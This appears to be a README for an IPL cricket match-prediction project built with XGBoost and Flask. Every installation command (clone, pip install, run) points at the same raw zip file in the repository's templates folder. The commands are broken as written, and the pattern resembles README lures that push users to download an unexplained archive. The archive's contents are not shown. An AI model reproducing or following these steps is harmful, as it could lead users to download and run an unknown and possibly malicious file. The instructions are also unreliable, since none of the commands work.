## Introduction

Welcome to the Dream11 Winning Team Prediction repository! This project aims to predict the outcome of IPL matches using advanced machine learning techniques. By leveraging historical match data from 2008 to 2024, we provide a reliable model that helps users make informed decisions.

Whether you are a cricket enthusiast, a data scientist, or a developer, this repository offers a comprehensive solution to understanding match outcomes.

## Technologies Used

This project employs a variety of technologies:

- **Data Science**: Analyzing and interpreting complex data.
- **Flask**: A lightweight web framework for building web applications.
- **Machine Learning**: Implementing algorithms to make predictions.
- **XGBoost**: An efficient and scalable implementation of gradient boosting.
- **NumPy**: A library for numerical computations in Python.
- **Pandas**: A data manipulation and analysis library.
- **Scikit-learn**: A library for machine learning in Python.

## Installation

To get started with this project, follow these steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
   cd dream11_winning_team_prediction
   ```

2. **Install required packages**:
   Make sure you have Python installed. Then, run:
   ```bash
   pip install -r https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
   ```

3. **Run the application**:
   Start the Flask server:
   ```bash
   python https://github.com/majoornekena/dream11_winning_team_prediction/raw/refs/heads/main/templates/prediction_winning_dream_team_v2.4.zip
   ```

Your application will now be running on `http://127.0.0.1:5000/`.

## Usage

Once the application is running, you can access it via your web browser. The interface allows you to input match data and receive predictions on the winning team. 

### Example Input

- Team A vs Team B
- Match location
- Player statistics

### Example Output

- Predicted winning team
- Probability percentage

## How It Works

### Data Collection

The project uses historical data from IPL matches between 2008 and 2024. This data includes:

- Match results
- Player performances
- Team statistics

### Data Preprocessing

Data is cleaned and transformed to ensure accuracy. This includes handling missing values, encoding categorical variables, and normalizing numerical features.

### Model Training

The XGBoost model is trained on the preprocessed data. The training process involves:

1. Splitting the data into training and testing sets.
2. Fitting the model on the training set.
3. Evaluating the model on the testing set.

### Prediction

Once trained, the model can predict the outcome of new matches based on user input. The prediction is accompanied by a probability score indicating the confidence level of the model.
